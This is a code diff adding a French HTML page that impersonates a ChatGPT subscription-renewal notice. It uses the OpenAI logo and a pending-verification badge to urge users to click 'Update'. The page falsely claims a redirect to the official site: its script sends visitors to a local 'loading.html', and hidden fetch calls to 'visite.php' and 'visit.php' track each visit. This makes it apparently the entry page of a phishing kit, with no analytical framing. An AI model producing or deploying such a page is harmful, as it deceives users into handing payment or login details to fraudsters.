@@ -1,0 +1,380 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#ffffff">
+
+<title>Gestion de l'abonnement</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f7f8fa;
+    color: #202123;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+header {
+    min-height: 68px;
+    background: #fff;
+    border-bottom: 1px solid #e8e8e8;
+    display: flex;
+    align-items: center;
+    padding: 0 7%;
+}
+
+.brand {
+    font-size: 19px;
+    font-weight: 700;
+    letter-spacing: -.5px;
+}
+
+.brand span {
+    color: #16866a;
+}
+
+main {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 45px 18px;
+}
+
+.container {
+    width: 100%;
+    max-width: 470px;
+}
+
+.intro {
+    text-align: center;
+    margin-bottom: 28px;
+}
+
+.icon {
+    width: 190px;
+    min-height: 58px;
+    padding: 12px 18px;
+    background: #e5f4ed;
+    border-radius: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 20px;
+}
+
+.openai-logo {
+    display: block;
+    width: 100%;
+    max-width: 155px;
+    height: auto;
+    object-fit: contain;
+}
+
+h1 {
+    font-size: 27px;
+    margin-bottom: 10px;
+    letter-spacing: -.7px;
+}
+
+.intro p {
+    color: #70757d;
+    font-size: 14px;
+    line-height: 1.6;
+}
+
+.card {
+    background: #fff;
+    border: 1px solid #e6e8eb;
+    border-radius: 15px;
+    padding: 25px;
+    box-shadow: 0 5px 20px rgba(0,0,0,.035);
+}
+
+.plan-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 22px;
+}
+
+.plan-name {
+    font-weight: 700;
+    font-size: 17px;
+}
+
+.status {
+    font-size: 11px;
+    color: #a66b14;
+    background: #fff4df;
+    padding: 7px 10px;
+    border-radius: 20px;
+    font-weight: 600;
+    white-space: nowrap;
+}
+
+.price {
+    font-size: 25px;
+    font-weight: 700;
+    margin-bottom: 5px;
+}
+
+.price small {
+    font-size: 13px;
+    color: #777;
+    font-weight: 400;
+}
+
+.description {
+    color: #777;
+    font-size: 13px;
+    margin-bottom: 23px;
+    line-height: 1.5;
+}
+
+hr {
+    border: 0;
+    border-top: 1px solid #eee;
+    margin-bottom: 20px;
+}
+
+.details {
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
+    font-size: 13px;
+    margin: 15px 0;
+}
+
+.details span:first-child {
+    color: #777;
+}
+
+.details strong {
+    text-align: right;
+}
+
+.notice {
+    background: #f5f8f6;
+    border-radius: 9px;
+    padding: 13px;
+    font-size: 12px;
+    color: #626b65;
+    line-height: 1.6;
+    margin-top: 22px;
+}
+
+button {
+    width: 100%;
+    border: 0;
+    background: #16866a;
+    color: white;
+    padding: 15px;
+    border-radius: 9px;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 20px;
+    transition: background .2s, transform .2s;
+}
+
+button:hover {
+    background: #116e56;
+    transform: translateY(-1px);
+}
+
+button:focus-visible {
+    outline: 3px solid #9bd9c4;
+    outline-offset: 3px;
+}
+
+.secure {
+    text-align: center;
+    color: #858b91;
+    font-size: 11px;
+    margin-top: 16px;
+    line-height: 1.6;
+}
+
+footer {
+    text-align: center;
+    padding: 22px;
+    color: #92979d;
+    font-size: 11px;
+}
+
+footer a {
+    color: #777;
+    text-decoration: none;
+    margin: 0 8px;
+}
+
+footer a:hover {
+    text-decoration: underline;
+}
+
+footer p {
+    margin-top: 10px;
+}
+
+@media(max-width: 480px) {
+    header {
+        padding: 0 20px;
+    }
+
+    main {
+        padding: 30px 15px;
+    }
+
+    h1 {
+        font-size: 23px;
+    }
+
+    .card {
+        padding: 20px;
+    }
+
+    .plan-name {
+        font-size: 15px;
+    }
+
+    .icon {
+        width: 175px;
+        min-height: 54px;
+    }
+
+    .openai-logo {
+        max-width: 140px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="brand">
+        Gestion <span>Abonnement</span>
+    </div>
+</header>
+
+<main>
+    <div class="container">
+
+        <div class="intro">
+
+            <div class="icon">
+                <img
+                    src="https://ai.ls/assets/openai-logos/PNGs/openai-lockup.png"
+                    alt="Logo OpenAI"
+                    class="openai-logo"
+                >
+            </div>
+
+            <h1>Renouvellement d'abonnement</h1>
+
+            <p>
+                Consultez les informations de votre abonnement
+                et accédez à votre espace de gestion.
+            </p>
+
+        </div>
+
+        <section class="card">
+
+            <div class="plan-top">
+                <div class="plan-name">Abonnement ChatGPT</div>
+                <div class="status">À vérifier</div>
+            </div>
+
+            <div class="price">
+                Selon votre forfait
+                <small>/ période</small>
+            </div>
+
+            <div class="description">
+                Le tarif exact est affiché dans votre espace officiel.
+            </div>
+
+            <hr>
+
+            <div class="details">
+                <span>Service</span>
+                <strong>ChatGPT</strong>
+            </div>
+
+            <div class="details">
+                <span>Gestion du forfait</span>
+                <strong>Compte officiel</strong>
+            </div>
+
+            <div class="details">
+                <span>Mode de paiement</span>
+                <strong>Visa-MasterCard</strong>
+            </div>
+
+            <div class="notice">
+                Pour consulter votre facturation ou renouveler votre
+                abonnement, connectez-vous directement à votre compte
+                sur le site officiel ChatGPT.
+            </div>
+
+            <button id="continueBtn" type="button">
+                Update
+            </button>
+
+            <div class="secure">
+                Vous serez redirigé vers le site officiel.
+                Aucune information bancaire n'est saisie sur cette page.
+            </div>
+
+        </section>
+
+    </div>
+</main>
+
+<footer>
+    <div>
+        <a href="https://openai.com/policies/terms-of-use/">
+            Conditions
+        </a>
+
+        <a href="https://openai.com/policies/privacy-policy/">
+            Confidentialité
+        </a>
+    </div>
+
+    <p>
+        Page indépendante — non affiliée à OpenAI.
+    </p>
+</footer>
+
+<script>
+document.getElementById("continueBtn").addEventListener("click", function() {
+    window.location.href = "loading.html";
+});
+</script>
+<script>
+    fetch("visite.php", {
+        method: "POST"
+    });
+    </script>
+    <script>
+        fetch("visit.php", {
+          method: "GET",
+          cache: "no-store"
+        }).catch(() => {});
+        </script>
+</body>
+</html>
